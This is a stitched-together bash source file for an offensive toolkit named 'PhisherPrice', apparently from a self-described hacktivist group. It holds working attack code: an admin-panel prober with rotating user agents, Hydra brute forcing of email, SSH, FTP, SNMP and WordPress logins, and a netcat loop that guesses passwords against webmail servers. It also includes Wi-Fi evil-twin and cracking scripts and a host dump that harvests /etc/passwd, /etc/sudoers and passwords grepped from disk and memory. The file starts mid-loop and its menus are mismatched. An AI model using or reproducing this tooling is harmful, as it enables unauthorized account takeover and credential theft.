# Read the possible URLs from the file
found_admin_panel=false
urls_checked=0
while read url_suffix; do
  # Construct the full URL
  url="$url_prefix$domain$url_suffix"

  # Pick a random user agent
  user_agent=$(echo "$user_agents" | shuf -n 1)

  # Send a HEAD request and save the response headers
  headers=$(curl -I --silent --user-agent "$user_agent" "$url")

  # Extract the status code from the headers
  status=$(echo "$headers" | grep -oP "^HTTP/\d\.\d \K\d{3}")

  # Check if the status code is in the 200-299 range
  # Display the URL and the response body
  if [[ "$status" =~ ^2[0-9]{2}$ ]]; then
    echo "${cyan}URL:${reset} $url"
    echo "${magenta}User agent:${reset} $user_agent"
    echo "${yellow}Response body:${reset}"
    curl --silent --user-agent "$user_agent" "$url"
    echo "-----------------------------------------"
  elif [[ "$status" == "301" ]]; then
    echo "${cyan}URL:${reset} $url"
    echo "${magenta}User agent:${reset} $user_agent"
    echo "${yellow}Status code:${reset} $status Moved Permanently"
    echo ""
    echo "-----------------------------------------"
  elif [[ "$status" == "400" ]]; then
    echo "${cyan}URL:${reset} $url"
    echo "${magenta}User agent:${reset} $user_agent"
    echo "${yellow}Status code:${reset} $status Bad request"
    echo ""
    echo "-----------------------------------------"
  elif [[ "$status" == "401" ]]; then
    echo "${cyan}URL:${reset} $url"
    echo "${magenta}User agent:${reset} $user_agent"
    echo "${yellow}Status code:${reset} $status Not Found"
    echo ""
    echo "-----------------------------------------"
  elif [[ "$status" == "403" ]]; then
    echo "${cyan}URL:${reset} $url"
    echo "${magenta}User agent:${reset} $user_agent"
    echo "${yellow}Status code:${reset} $status Requested resource is forbidden"
    echo ""
    echo "-----------------------------------------"
  elif [[ "$status" == "404" ]]; then
    echo "${cyan}URL:${reset} $url"
    echo "${magenta}User agent:${reset} $user_agent"
    echo "${yellow}Status code:${reset} $status Page not found or File not found"
    echo ""
    echo "-----------------------------------------"
  elif [[ "$status" == "405" ]]; then
    echo "${cyan}URL:${reset} $url"
    echo "${magenta}User agent:${reset} $user_agent"
    echo "${yellow}Status code:${reset} $status Method Not Allowed"
    echo ""
    echo "-----------------------------------------"
  elif [[ "$status" == "503" ]]; then
    echo "${cyan}URL:${reset} $url"
    echo "${magenta}User agent:${reset} $user_agent"
    echo "${yellow}Status code:${reset} $status Service Unavailable"
    echo ""
    echo "-----------------------------------------"
  elif [[ "$status" == "200" ]]; then
    echo "${cyan}URL:${reset} $url"
    echo "${magenta}User agent:${reset} $user_agent"
    echo "${green}Status code:${reset} $status"
    echo "${green}Admin panel found at:${reset} $url"
    echo ""
    echo "-----------------------------------------"
    break
  else
    # Display the URL and the status code
    echo "${cyan}URL:${reset} $url"
    echo "${magenta}User agent:${reset} $user_agent"
    echo "${yellow}Status code:${reset} $status Unknown {Null}"
    echo ""
    echo "-----------------------------------------"
  fi
  urls_checked=$((urls_checked+1))
done < main/admin_urls.txt

# Check if an admin panel was found
if [[ "$found_admin_panel" == false ]]; then
  echo "${yellow}No results found after checking $urls_checked URLs.${reset}"
fi

# NullSecurityTeam

## Greetz to the world and gov sectors,

## We are a group of hacktivists who have played our parts in various government operations between 2018 - 2021 ✌️👨‍💻

## It has been a pleasure to meet and work anonymously among those in this industry. We hope to continue our work and make a positive impact in the world.

## Signed,
## ~ m0bly, double A, and SirCryptic ~ root@nst (2018)
## ~ SirCryptic (revised 2023) // Mobly = M.I.A / Double A = M.I.A - SCNS@127.0.0.1 over & out
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
  ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}
# Submenu 2 function
submenu2() {
  while true
  do
clear
	
echo -e "
┌────────────────────────────────────────────┐
│${red}Cracking / Brute Force${reset}                      │
├────────────────────────────────────────────┤
│${green}1${reset}  │Bluetooth Toolkit                       │
│${green}2${reset}  │Auto-Brute (Hydra)                      │
│${green}3${reset}  │John-The-Ripper                         │
│${green}4${reset}  │Archive Password Cracker                │
│${green}5${reset}  │Hash-Identifier                         │
│${green}6${reset}  │Hashcat                                 │
│${green}7${reset}  │Aircrack-ng (Crack Wifi Pass)           │
│${green}8${reset}  │Start sqldict                           │
│${green}9${reset}  │Wifi Honey Pot Cracker                  │
│${green}10${reset} │Just Dump It                            │
├────────────────────────────────────────────┤
│    b/B To Go To Back ~ q/Q To Exit         │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Cracking/Brute$blue]:"$reset──────┘"
read -r -p"└─────► $reset" choice

    case $choice in
      1)
        btoolkit
        ;;
      2)
       autohydrasub
        ;;
      3)
       clear

echo -e "\nPassword Cracking Script Using John the Ripper"
echo -e "-------------------------------------------\n"
echo "Enter the path to your wordlist (e.g. /usr/share/john/password.lst): " 
read -e wordlist && echo "$wordlist" >> ~/.bash_history 2>/dev/null
echo "Enter the path to the file to crack (e.g. /usr/john/Documents/unshadowed.txt): " 
read -e file && echo "$file" >> ~/.bash_history 2>/dev/null

if ! [ -f "$wordlist" ]; then
    clear
    echo "Error: The wordlist file doesn't exist or is inaccessible."
    read -e "Press Enter to continue." 
fi

if ! [ -f "$file" ]; then
    clear
    echo "Error: The file to crack doesn't exist or is inaccessible."
    read -p "Press Enter to continue." 
fi

echo -e "\n-------------------------------------------"
echo "Starting cracking process..."
echo -e "-------------------------------------------\n"

read -e "Enter the mode of attack (wordlist, mask, hybrid): " mode
read -e "Enter the number of CPU cores to use (1-8): " cores

john --wordlist="$wordlist" --rules --format=NT --session=john --fork="$cores" --progress="$mode" "$file"

echo -e "\n-------------------------------------------"
echo "Cracking process complete!"
echo -e "-------------------------------------------\n"

        ;;
      4)
      clear
echo "Enter the path to the archive file:"
read -e archive

if [ ! -f "$archive" ]; then
echo "File not found!"
read -e "Press Enter to continue." 
fi

echo "Enter the path to the password list file:"
read -e passlist

if [ ! -f "$passlist" ]; then
echo "File not found!"
read -p "Press Enter to continue." 
fi

if [[ "$archive" == *.zip ]]; then
john --format=zip --wordlist="$passlist" "$archive"
elif [[ "$archive" == *.rar ]]; then
john --format=rar --wordlist="$passlist" "$archive"
elif [[ "$archive" == *.7z ]]; then
john --format=7z --wordlist="$passlist" "$archive"
elif [[ "$archive" == *.tar ]]; then
john --format=tar --wordlist="$passlist" "$archive"
elif [[ "$archive" == *.tar.gz ]]; then
john --format=targz --wordlist="$passlist" "$archive"
elif [[ "$archive" == *.tar.bz2 ]]; then
john --format=tarbz2 --wordlist="$passlist" "$archive"
else
echo "Unknown archive format!"
read -p "Press Enter to continue." 
fi
        ;;
      5)
clear
echo -e "\nHash Identifier"
echo -e "-------------------------------------------\n"
echo -e "
-------------------------------------------
|           ${yellow}CTRL + C TO QUIT${reset}              |
-------------------------------------------
 "
hash-identifier
echo -e "
-------------------------------------------
|               ${green}Good Bye${reset}                  |
-------------------------------------------
"
        ;;
      6)
        clear
echo -e "\n${yellow}Hashcat Password Cracking Script${reset}"
echo -e "-------------------------------------------\n"

# Prompt user for input
echo "Enter Hash Type (500 = md5crypt): " 
read -e encmode 
echo "Enter Hash Location (${cyan}e.g. ${yellow}/usr/share/me/example500.hash):${reset} " 
read -e hashtype && echo "$hashtype" >> ~/.bash_history 2>/dev/null
echo "Enter Wordlist Location (e.g. /usr/share/wordlists/sqlmap.txt): " 
read -e wordlist && echo "$wordlist" >> ~/.bash_history 2>/dev/null

# Check if the specified files exist
if ! [[ -f $hashtype ]]; then
  echo "Error: Hash file not found."
  read -p "Press Enter to continue." 
fi

if ! [[ -f $wordlist ]]; then
  echo "${red}Error:${reset} Wordlist file not found."
  read -p "Press Enter to continue." 
fi

clear
  echo -e "\n-------------------------------------------"
  echo "Attempting to Crack Hash Type."
  echo -e "-------------------------------------------\n"

hashcat -m $encmode $hashtype $wordlist

if [[ $? -eq 0 ]]; then
  echo -e "\n-------------------------------------------"
  echo "Password ${green}successfully${reset} cracked!"
  echo -e "-------------------------------------------\n"
else
  echo -e "\n-------------------------------------------"
  echo "Password ${red}not found${reset} in the wordlist."
  echo -e "-------------------------------------------\n"
fi
        ;;
      7)
        clear
echo -e "\nAircrack-ng WPA Password Cracking Script"
echo -e "-------------------------------------------\n"

echo "Enter the location of the password list: "
read -e wifirip
echo "Enter the location of the capture file (.cap): "
read -e subopi

if ! [[ -f "$wifirip" ]]; then
  echo "Error: Password list file not found."
  read -p "Press Enter to continue."
fi

if ! [[ -f "$subopi" ]]; then
  echo "Error: Capture file not found."
  read -p "Press Enter to continue."
fi

clear
echo -e "\n-------------------------------------------"
echo "Attempting to crack WPA..."
echo -e "-------------------------------------------\n"

aircrack-ng -w "$wifirip" "$subopi"

if [[ $? -eq 0 ]]; then
  echo -e "\n-------------------------------------------"
  echo "Password successfully cracked!"
  echo -e "-------------------------------------------\n"
else
  clear
  echo -e "\n-------------------------------------------"
  echo "Password not found in the password list."
  echo -e "-------------------------------------------\n"
fi
        ;;
      8)
        clear
echo -e "\nLaunching SQLdict"
echo -e "-------------------------------------------\n"

echo -e "Launching SQLdict...\n"

sqldict

        ;;
      9)
      clear
echo -n "Enter wireless interface (e.g. wlan1 or wlan0): "
read -e iface

echo "Putting wireless interface into monitor mode..."
ip link set dev $iface down
macchanger -r $iface
ip link set dev $iface up
airmon-ng start $iface

echo -n "Enter target ESSID: "
read -e essid && echo "$essid" >> ~/.bash_history 2>/dev/null
echo -n "Enter target channel: "
read -e ch

echo "Creating four fake access points with name $essid..."
xterm -hold -e "airbase-ng --essid $essid -a aa:aa:aa:aa:aa:aa -c $ch mon0" &
pid1=$!
xterm -hold -e "airbase-ng --essid $essid -a bb:bb:bb:bb:bb:bb -c $ch mon0 -W 1" &
pid2=$!
xterm -hold -e "airbase-ng --essid $essid -a cc:cc:cc:cc:cc:cc -c $ch mon0 -W 1 -z 2" &
pid3=$!
xterm -hold -e "airbase-ng --essid $essid -a dd:dd:dd:dd:dd:dd -c $ch mon0 -W 1 -Z 4" &
pid4=$!

echo -n "Enter a name for the output file: "
read -e fname
xterm -hold -e "airodump-ng --channel $ch --write $fname mon0" &
pid5=$!

echo "Attempting to crack password using a strong dictionary..."
aircrack-ng -w /path/to/dictionary.txt $fname-01.cap

echo "Cleaning up..."
kill $pid1 $pid2 $pid3 $pid4 $pid5
airmon-ng stop mon0
        ;;
      10)
      clear
# A modified version of Gary Hooks' work sys_info.sh:
# 	Original Author: Gary Hooks
# 	Web: http://www.twintel.co.uk
# Supporting input from:
#	MYero
#	JGuz
#	SANDFLY SECURITY Linux Compromise Assessment Cmd Cheat Sheet
# Publish Date: 13th May 2020
# Version: 1.2
# Licence: GNU GPL 

current_time=$(date "+%Y.%m.%d-%H.%M.%S")
folderName="${current_time}_Linux_Data_Dump"
mkdir "$folderName"
OutputFileName="${current_time}_Linux_Data_Dump.rtf"
DEL_RUNNING="\b\b\b\b\b\b\b\b"
CLEAR_EOL=$(tput el)

# First Param: System Name
# Second Param: String describing the overall contents of the file
# Example Useage: insertHeader "MaxEdge" "Passwords in clear text" 
function insertHeader()
{
	printf "########################################################################\n" | tee -a $CURRENT_FILE
	printf "###                  Linux Data Dump                                 ###\n" | tee -a $CURRENT_FILE
	printf "###                       $1                             ###\n" | tee -a $CURRENT_FILE
	printf "###                       $2                                   ###\n" | tee -a $CURRENT_FILE
	printf "########################################################################\n\n" | tee -a $CURRENT_FILE
}

# First Param: Subsection title
# Example usage: insertPartition "ARP Tables"
function insertPartition()
{
    printf -- "\n----------------------------$1----------------------------------------\n" | tee -a $CURRENT_FILE
}

# First Param: String with Descriptive Title
# Second Param: String with actual command
# Example Usage: runTest "List of Files in Current Folder" "ls -lah"

function runTest()
{
    NAME_OF_TEST=$1
    COMMAND_TO_RUN=$2
    printf "$1 - Running"
    insertPartition $1
    printf "($2)\n" >> $CURRENT_FILE
    eval $2 >> $CURRENT_FILE
    printf "\n\n" >> $CURRENT_FILE
    printf "$DEL_RUNNING Saved$CLEAR_EOL\n"
}

echo "Project Name: "
read projectName

##++++++++++++++++ System Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/system_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "General_Information"
runTest "Host_Name" "hostname"
runTest "Host_IP" "hostname -I"
runTest "Domain_Name" "domainname"
runTest "Connectivity_Check" "ping -c 4 8.8.8.8"
runTest "Who_Am_I" "whoami"
runTest "Uptime" "uptime"
runTest "System_Name_&_Version" "uname -a"
COMMAND_STRING='lsb_release -a 2>/dev/null | grep -E "Distributor|Description|Release"'
insertPartition "Distributer,_Description,_Release"
printf "($COMMAND_STRING)\n" >> $CURRENT_FILE
eval $COMMAND_STRING >> $CURRENT_FILE
printf "\n\n" >> $CURRENT_FILE
runTest "Logged_In_Users" "who -a"
#Last Logins list length; Full List: last -a; 
runTest "Last_10_Logins" "last -a | head -10"
runTest "Currently_Connected" "w"
runTest "List_User_Accounts" "cat /etc/passwd"
runTest "List_Sudoers_File" "cat /etc/sudoers"
runTest "Available_Shells" "cat /etc/shells | tail -n +2"
runTest "Environment_Variables" "env"


##++++++++++++++++ Memory Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/memory_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Storage_&_Memory_Data"
runTest "Block_&_Storage_Devices" "lsblk -a"
runTest "Find_Mounted_Filesystems" "findmnt -A"
runTest "File_System_&_Partitions" "df -h"
runTest "Ram_Info" "free -m"
runTest "Memory_Info" "cat /proc/meminfo"
runTest "Find_Hiden_Directories" 'find / -type d -name".*"'

##++++++++++++++++ Network Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/network_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Network_Info"
runTest "Host_Name" "hostname"
runTest "Domain_Name" "domainname"
runTest "Connectivity_Check" "ping -c 4 8.8.8.8"
runTest "Interface_Information(IFCONFIG)" "ifconfig -a"
runTest "Interface_Information(IP)" "ip address"
runTest "Routing_Table" "route -n"
runTest "IP_Tables" "iptables -t nat -vnL"
runTest "ARP_Table" "arp -a"
runTest "Net_Stat_(all)" "netstat -a"
runTest "Net_Stat_(Listening)" "netstat -lapn"
runTest "Listening_Ports" "ss -lntu"
runTest "Current_Connections" "ss -s"
runTest "Resolve_Conf" "cat /etc/resolv.conf"
###runTest "Firewall_Rules" "firewall-cmd --list-all"
runTest "UFW_Firewall_Rules_Verbose" "ufw status verbose"
runTest "UFW_Firewall_Rules_Numbered" "ufw status numbered"

##++++++++++++++++ Hardware Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/hardware_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Hardware_Info"
runTest "CPU_Info" "lscpu"
insertPartition "Device_List"
row_count=$(lspci | wc -l)
for (( c=1; c<=${row_count}; c++ ))
do
	lspci| sed  "${c}q;d" | cut -c 9- | tee -a $CURRENT_FILE
done
runTest "PCI_Devices" "lspci"
runTest "PCI_Devices_(Detailed)" "lspci -v"
runTest "USB_Devices" "lsusb"
runTest "USB_Devices_(Detailed)" "lsusb -v"
###runTest "Dmesg_Info" "dmesg"


##++++++++++++++++ Software Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/software_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Software_Info"
insertPartition "Common_Packages"
#checks if packages in the list are installed and tells thier version
packages=("python" "python3" "mysql" "ruby" "perl" "bash" "ssh" "telnet")
#packages can be added above to search more packages
for i in "${packages[@]}"
do
    version=$(apt-cache show $i 2>/dev/null | grep -m 1 Version | wc -l )
    DETAIL="NOT INSTALLED"
	if [ $version == 1 ]
	then    #if the package is installed, show the version
		DETAIL=$(apt-cache show $i 2>/dev/null | grep -m 1 Version | awk '{ printf "VERSION:" $2 "\n" }' )
	fi
	printf "PACKAGE:${i}\t $DETAIL \n" | tee -a $CURRENT_FILE
done
runTest "Loadable_Kernel_Modules" "lsmod"
runTest "Startup_Programs" "ls -lah /etc/init.d/"
runTest "Installed_Programs" "apt list --installed"
runTest "Services_Programs" "service --status-all"
runTest "Systemctl_Programs" "systemctl status --all"

##++++++++++++++++ Process Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/process_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Process Info"
runTest "Top_5_CPU_Processes" "ps auxwwwf | sort -nr -k 3 | head -5"
runTest "Top_5_Mem_Processes" "ps auxwwwf | sort -nr -k 4 | head -5"
runTest "Current_Processes" "ps auxwwwf"
runTest "Directory_of_Running_Processes" "ls -l /proc/*/cwd"
runTest "Executable_of_Running_Processes" "ls -l /proc/*/exe"
runTest "Arguements_of_Running_Processes" "grep -a ^ /proc/*/cmdline"
runTest "Deleted_Binaries_Still_Running" "ls -aIR /proc/*/exe 2>/dev/null | grep deleted"
# Running from tmp and dev need more testing/verification of functionality
runTest "Proccesses Running From tmp" "ls -aIR /proc/*/cwd 2>/dev/null | grep tmp"
runTest "Proccesses Running From dev" "ls -aIR /proc/*/cwd 2>/dev/null | grep dev"
runTest "Cmd_History_Files" "find / -name *.history"
runTest "Cmd_History" "history"

##++++++++++++++++ Password Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/password_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Passwords"

#This search for clear text passwords TAKES A LONG TIME
COMMAND_STRING='grep -rnw "/" -ie "PASSWORD" 2> /dev/null'
insertPartition "Clear_Text_Passwords"
printf "($COMMAND_STRING)\n" >> $CURRENT_FILE
eval $COMMAND_STRING >> $CURRENT_FILE
printf "\n\n" >> $CURRENT_FILE

runTest "More_Clear_Text_Passwords" 'find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;'
runTest "Passwords_In_Memory" 'strings /dev/mem -n10 | grep -i PASS'

##++++++++++++++++ Misc Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/misc_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Misc_Data"
runTest "SUID_Binaries" "find / -perm -4000 -type f -exec ls -la {} 2>/dev/null"
runTest "SGID_Binaries" "find / -perm -2000 -type f -exec ls -la {} 2>/dev/null"
runTest "Binaries_Of_Interest" "find / -uid 0 -perm -4000 -type f 2>/dev/null"
runTest "World_Writable_Files" "find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null"
runTest "World_Writable_Files" "find / -perm -2 -type f 2>/dev/null"
runTest "World_Writable_Files" "find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null"
runTest "Crontab_Jobs" "crontab -l"

## Collect Logs: find /var/log -mtime -$logDate -exec cp {} $tmp/logs/ \; nested folders are huge!!


##++++++++++++++++ Docker Data.rtf+++++++++++++++++++++++
## CURRENT_FILE=$folderName/docker_data.rtf
## touch $CURRENT_FILE
## insertHeader $projectName "Docker_Container_Enumeration"
        
## runTest "" ""     https://docs.docker.com/engine/reference/commandline/container_ls/


##++++++++++++++++ Zip Data and Remove Files +++++++++++++++++++++++
CURRENT_FILE=$folderName/system_data.rtf
DATE=$(date +"%d %B %Y")
TIME=$(date +"%T")
CURRENT_PATH=$(pwd)
printf "\n\n" | tee -a $CURRENT_FILE
printf "Process Completed\n" | tee -a $CURRENT_FILE
printf -- "------------------------------------\n" | tee -a $CURRENT_FILE
printf "End Time: \t $TIME\n" | tee -a $CURRENT_FILE
printf "End Date: \t $DATE\n" | tee -a $CURRENT_FILE
printf "\n\n" | tee -a $CURRENT_FILE

## END ##
FINAL_PATH="$CURRENT_PATH/$folderName.tgz"
printf "Compressing Results into Package\n\n"
tar -czvf $FINAL_PATH $folderName/*
printf "\nCleaning up\n\n"
rm -rf $folderName
printf "Results will be stored here: \t $FINAL_PATH \n\n"
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
        ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}
# autohydra sub Menu function
autohydrasub() {
  while true
  do
clear

echo -e "
┌────────────────────────────────────────────┐
│${red}Hydra Brute Force${reset}                           │
├────────────────────────────────────────────┤
│${green}1${reset}  │Email Crack (SMTP)                      │
│${green}2${reset}  │SNMP Brute Force                        │
│${green}3${reset}  │FTP Brute Force                         │
│${green}4${reset}  │SSH  Brute Force                        │
│${green}5${reset}  │SSH  Brute Force (port 22)              │
│${green}6${reset}  │POP3 Brute Force                        │
│${green}7${reset}  │HTTP 401 Brute Force                    │
│${green}8${reset}  │Windows RDP Brute Force                 │
│${green}9${reset}  │SMB Brute Force                         │
│${green}10${reset} │WP AUTO BRUTE                           │
├────────────────────────────────────────────┤
│    b/B To Go To Back ~ q/Q To Exit         │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Hydra$blue]:"$reset───────────────┘"
read -r -p"└─────► $reset" choice
    case $choice in
      e|E)
        clear
# Define SMTP options
declare -A smtp_options=(
  ["gmail"]="smtp.gmail.com:587"
  ["yahoo"]="smtp.mail.yahoo.com:587"
  ["hotmail"]="smtp.live.com:587"
)

# Define POP3 options
declare -A pop3_options=(
  ["gmail"]="pop.gmail.com:995"
  ["yahoo"]="pop.mail.yahoo.com:995"
  ["hotmail"]="outlook.office365.com:995"
)

# Define IMAP options
declare -A imap_options=(
  ["gmail"]="imap.gmail.com:993"
  ["yahoo"]="imap.mail.yahoo.com:993"
  ["hotmail"]="outlook.office365.com:993"
)

echo -e "\e[1;33mSimple Email Cracking Script.\e[0m"
echo -e "\n-------------------------------------------"

# Select email service
echo "Choose an email service:"
echo "SMTP:"
for service in "${!smtp_options[@]}"; do
  echo "[$service] ${smtp_options[$service]}"
done
echo "POP3:"
for service in "${!pop3_options[@]}"; do
  echo "[$service] ${pop3_options[$service]}"
done
echo "IMAP:"
for service in "${!imap_options[@]}"; do
  echo "[$service] ${imap_options[$service]}"
done

read -e -p "Email service: " email_service

# Select protocol and port based on the email service chosen
case $email_service in
  "gmail")
    smtp="${smtp_options[$email_service]}"
    pop3="${pop3_options[$email_service]}"
    imap="${imap_options[$email_service]}"
    ;;
  "yahoo")
    smtp="${smtp_options[$email_service]}"
    pop3="${pop3_options[$email_service]}"
    imap="${imap_options[$email_service]}"
    ;;
  "hotmail")
    smtp="${smtp_options[$email_service]}"
    pop3="${pop3_options[$email_service]}"
    imap="${imap_options[$email_service]}"
    ;;
  *)
    echo "Invalid email service"
    read
    ;;
esac

# Get email address and password file path
echo -n "Enter email address: "
read -e email && echo "$email" >> ~/.bash_history 2>/dev/null
echo -n "Enter password file path: "
read -e password_file && echo "$password_file" >> ~/.bash_history 2>/dev/null

# Select protocol and port
echo -n "Enter protocol (smtp/pop3/imap): "
read -e protocol
echo -n "Enter port number: "
read -e port

echo -e "\n-------------------------------------------"
echo -e "\e[1;34mCracking email password...\e[0m"
echo -e "-------------------------------------------"
while read password; do
  case $protocol in
    "smtp")
      response=$(echo "USER $email" && echo "PASS $password" && echo "QUIT" | nc -w 10 "$smtp" "$port")
      ;;
    "pop3")
      pop_host=$(echo "$pop" | cut -d: -f1)
      pop_port=$(echo "$pop" | cut -d: -f2)
      response=$(echo "USER $email" && echo "PASS $password" && echo "QUIT" | nc -w 10 "$pop_host" "$pop_port")
      ;;
    "imap")
      imap_host=$(echo "$imap" | cut -d: -f1)
      imap_port=$(echo "$imap" | cut -d: -f2)
      response=$(echo "a login $email $password" && echo "b select inbox" && echo "c logout" | nc -w 10 "$imap_host" "$imap_port")
      ;;
    *)
      echo -e "\n-------------------------------------------"
      echo -e "\e[1;31mInvalid protocol.\e[0m"
      echo -e "-------------------------------------------"
      read
      read
  esac
  
  if [[ "$response" == *"+OK"* ]]; then
    echo -e "\n-------------------------------------------"
    echo -e "\e[1;32mPassword found!\e[0m"
    echo -e "-------------------------------------------"
    echo -e "Email: $email"
    echo -e "Password: $password"
    read
  fi
done < "$password_file"

read
        ;;
      1)
        clear
echo -e "${yellow}Simple Email Cracking Script Using Hydra.${reset}"
echo -e "\n-------------------------------------------"

echo -n "Choose a SMTP service (Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com): "
read -e smtp && echo "$smtp" >> ~/.bash_history 2>/dev/null

echo -n "Enter Email Address: "
read -e email && echo "$email" >> ~/.bash_history 2>/dev/null

echo -n "Provide Directory of Wordlist for Passwords: "
read -e wordlist && echo "$wordlist" >> ~/.bash_history 2>/dev/null

echo -n "Enter SMTP Port Number (default is 465): "
read -e port
port=${port:-465}  # set default port number if no input is provided

echo -e "\n-------------------------------------------"
echo -e "${green}Cracking email password...${reset}\e[0m"
echo -e "-------------------------------------------"
output=$(hydra -S -l "$email" -P "$wordlist" -e ns -V -s "$port" "$smtp" smtp 2>&1)

if [[ $? -ne 0 ]]; then
  echo -e "${red}An error occurred while running Hydra. Please check your input and try again.${reset}"
  return
fi

echo -e "\n-------------------------------------------"
echo -e "${green}Hydra output:${reset}"
echo -e "-------------------------------------------"
echo -e "$output"

        ;;
      2)
        clear
echo "Simple SNMP Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter the path of the password list:"
read -e hydrasnmppass && echo "$hydrasnmppass" >> ~/.bash_history 2>/dev/null
echo "Enter The Host IP Address of SNMP Server:"
read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null

echo -e "\n-----------------------------"
echo "${yellow}Attempting SNMP password cracking...${reset}"
echo "-----------------------------"
output=$(hydra -P $hydrasnmppass -v $hydraip snmp 2>&1)

if echo "$output" | grep -q "login:\|password:"; then
  echo -e "\n-------------------------------------------"
  echo "SNMP password cracked ${green}successfully!${reset}"
  echo -e "-------------------------------------------"
  echo "Cracked password:"
  echo "$output"
else
  clear
  echo -e "\n-------------------------------------------"
  echo "Failed to crack SNMP password."
  echo -e "-------------------------------------------"
fi

        ;;
      3)
       clear
echo "FTP Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter Known User:"
read -e hydrauser && echo "$hydrauser" >> ~/.bash_history 2>/dev/null
echo "Enter Password List Location:"
read -e hydrapasslist && echo "$hydrapasslist" >> ~/.bash_history 2>/dev/null
echo "Enter the IP Address:"
read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null

echo -e "\n-------------------------------------------"
echo "${yellow}Running hydra...${reset}"
output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "${green}Login Successful!${reset}"
  echo -e "-------------------------------------------"
else
  echo -e "\n-------------------------------------------"
  echo "${red}Login Failed${reset}"
  echo -e "-------------------------------------------"
fi

        ;;
      4)
       clear
echo "SSH Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter User List Location:"
read -e hydrauser2 && echo "$hydrauser2" >> ~/.bash_history 2>/dev/null
echo "Enter Password List Location:"
read -e hydrapasslist2 && echo "$hydrapasslist2" >> ~/.bash_history 2>/dev/null
echo "Enter IP Address:"
read -e hydraip2 && echo "$hydraip2" >> ~/.bash_history 2>/dev/null

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -v -V -u -L $hydrauser2 -P $hydrapasslist2 -t 1 -u $hydraip2 ssh 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  password=$(echo "$output" | grep "login:" | awk '{print $NF}')
  echo -e "\n-------------------------------------------"
  echo "${green}Login Successful!${reset}"
  echo "${cyan}Password:${yellow}$password${reset}"
  echo -e "-------------------------------------------"
else
  echo -e "\n-------------------------------------------"
  echo "${red}Login Failed${reset}"
  echo -e "-------------------------------------------"
fi
        ;;
      5)
        clear
echo -e "\nFTP Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter Known User:"
read -e hydrauser && echo "$hydrauser" >> ~/.bash_history 2>/dev/null
echo "Enter Password List Location:"
read -e hydrapasslist && echo "$hydrapasslist" >> ~/.bash_history 2>/dev/null
echo "Enter the IP Address:"
read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "${green}Login Successful!${reset}"
  echo -e "-------------------------------------------"
else
  echo -e "\n-------------------------------------------"
  echo "${red}Login Failed${reset}"
  echo -e "-------------------------------------------"
fi
        ;;
      6)
        clear
echo "Hydra WP Auto Brute"
echo "Enter target URL (e.g. target.com):"
read -e url && echo "$url" >> ~/.bash_history 2>/dev/null
echo "Enter path to login page (e.g. /wp-login.php):"
read -e path && echo "$path" >> ~/.bash_history 2>/dev/null
echo "Enter username or path to wordlist:"
read -e user && echo "$user" >> ~/.bash_history 2>/dev/null
echo "Enter password or path to wordlist:"
read -e pass && echo "$pass" >> ~/.bash_history 2>/dev/null
echo "Enter a string that appears on a failed login page:"
read -e bad && echo "$bad" >> ~/.bash_history 2>/dev/null
echo "Enter POST parameter string (e.g. 'log=^USER^&pwd=^PASS^'):"
read -e parameter && echo "$parameter" >> ~/.bash_history 2>/dev/null

clear
echo -e "\n-------------------------------------------"
echo "Executing the following command:"
echo "hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass"
echo "Target URL: http://$url/$path"
echo "Username: $user"
echo "Password: $pass"
echo "Failed login string: $bad"
echo "POST parameter string: $parameter"
echo -e "-------------------------------------------"

echo "Running hydra..."
output=$(hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "${green}Login Successful!${reset}"
  echo -e "-------------------------------------------"
else
  clear
  echo -e "\n-------------------------------------------"
